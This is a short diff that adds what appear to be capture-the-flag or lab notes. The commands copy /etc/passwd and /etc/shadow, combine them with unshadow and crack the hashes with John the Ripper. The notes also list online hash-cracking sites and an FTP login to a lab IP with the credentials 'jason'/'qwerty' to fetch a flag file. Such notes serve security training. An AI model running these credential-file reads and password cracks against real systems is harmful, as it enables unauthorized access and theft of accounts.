@@ -150,3 +150,24 @@
   whoami
   ```
 </details>
+
+ls /etc/passwd /etc/shadow
+mkdir unix
+cp /etc/passwd unix/passwd
+cp /etc/shadow unix/shadow
+ls unix/
+
+unshadow unix/passwd unix/shadow > unix/pwdump.txt
+john unix/pwdump.txt
+john unix/pwdump.txt --show
+
+網站
+crackstation.net
+gchq.github.io/CyberChef/
+md5cal.com
+
+ftp 10.10.10.10
+jason
+qwerty
+get Flag.txt
+
